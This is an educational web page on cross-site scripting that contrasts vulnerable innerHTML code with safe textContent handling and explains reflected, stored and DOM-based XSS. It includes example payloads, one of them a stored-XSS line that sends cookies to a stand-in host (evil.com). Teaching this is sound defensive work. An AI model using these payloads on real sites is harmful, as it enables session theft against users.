Cross-Site Scripting (XSS)

Educational demonstration of XSS vulnerabilities and defenses

Reflected XSS Attack

Try entering: <img src=x onerror="alert('XSS')">

// VULNERABLE CODE - DO NOT USE
function displayComment(input) {
  document.getElementById('output').innerHTML = input;
}

// If input = <img src=x onerror="alert('XSS')">
// The JavaScript inside the img tag EXECUTES!
// Attacker can steal cookies, redirect, deface the page, etc.
⚠️ WARNING: Any user input directly into innerHTML/dangerouslySetInnerHTML can execute JavaScript

Safe XSS Prevention

Try the same injection: <img src=x onerror="alert('XSS')">

// SAFE CODE - Use textContent instead of innerHTML
function displayComment(input) {
  document.getElementById('output').textContent = input;
}

// Or escape HTML entities:
function escapeHTML(str) {
  const div = document.createElement('div');
  div.textContent = str;
  return div.innerHTML;
}

// textContent treats ALL input as plain text, never as HTML/JS
✓ SAFE: User input is treated as text, not executable code

Types of XSS Attacks

1. Reflected XSS

Attacker sends link: http://site.com/search?q=<script>stealCookies()</script>
Victim clicks link → Server reflects input in response → Script executes
Impact: Immediate, affects one user per click

2. Stored XSS

Attacker posts comment with: <img src=x onerror="fetch('http://evil.com?cookie='+document.cookie)">
Server stores it in database → Every user who views comment gets attacked
Impact: Persistent, affects all users who see the content

3. DOM-Based XSS

JavaScript reads from: location.hash, window.name, etc.
var name = location.hash.substr(1);
document.getElementById('greeting').innerHTML = 'Hello ' + name;

Attacker link: http://site.com#<img src=x onerror="alert('XSS')">
Script on the page processes it → XSS executes
Impact: No server involved, purely client-side attack

📚 Learn More: What's XSS? (Explain Like I'm 5)

The Simple Story

Imagine you have a magic bulletin board where anything you write becomes real. If you write "apple," an apple appears. If you write "balloon," a balloon floats up.

Now imagine a troublemaker writes: "Make everyone's lunch disappear!" Because the board doesn't know the difference between good instructions and bad ones, it does it! That's XSS—sneaking in commands disguised as normal text.

What's Actually Happening?

Websites are built with HTML (the structure), CSS (the style), and JavaScript (the actions). When you submit a comment or message, the website displays your text. But what if your "text" contains secret JavaScript code?

❌ Malicious Comment:
<script>alert('You got hacked!');</script>

If the website doesn't check what you typed, it will run that code in everyone's browser who visits the page. The attacker could:

  • 🍪 Steal your cookies (which contain login sessions)
  • 🔑 Steal passwords you type
  • 🎣 Create fake login forms to trick you
  • 📍 Redirect you to malicious websites
  • 📸 Record everything you do on the page

Three Types of XSS

1. Stored XSS (Most Dangerous)

The attack is saved in the website's database. Every visitor who sees that page gets attacked. Example: Posting malicious code in a forum comment that stays there forever.

2. Reflected XSS

The attack is in a URL link. When someone clicks the malicious link, the code runs immediately. Example: A search page that shows your search term without checking it first.

3. DOM-Based XSS

The attack happens entirely in your browser without the server knowing. JavaScript on the page reads user input and uses it unsafely.

Real-World Examples

XSS has affected major sites:

  • 🐦 Twitter (2010): "Onmouseover" worm spread to 1 million+ users
  • 🔗 TweetDeck: XSS forced automatic retweets
  • 🎮 Steam: XSS allowed stealing of Steam accounts
  • 📘 Facebook: Multiple XSS vulnerabilities patched over the years

How Do We Stop It?

The key is to never trust user input! Always assume users might try to sneak in code.

✓ Safe Method: Use textContent
element.textContent = userInput;

This treats everything as plain text. Even if someone types <script>, it shows up as literal text instead of running.

❌ Dangerous Method: innerHTML
element.innerHTML = userInput;

This runs any code in the user input. Never use this with untrusted data!

Think of it like this: textContent is like putting text behind glass—you can see it but it can't touch you. innerHTML is like opening the door and letting anything walk in!

XSS Prevention Best Practices

  • ✓ Use textContent instead of innerHTML for user input
  • ✓ Escape HTML entities in untrusted content
  • ✓ Use template engines with auto-escaping
  • ✓ Implement Content Security Policy (CSP) headers
  • ✓ Validate and sanitize all user input
  • ✓ Use DOMPurify or similar libraries for HTML sanitization
  • ✓ Avoid eval(), Function(), and setTimeout() with user input
  • ✓ Use frameworks like React, Vue (auto-escape by default)
  • ✓ Regular security testing and code reviews
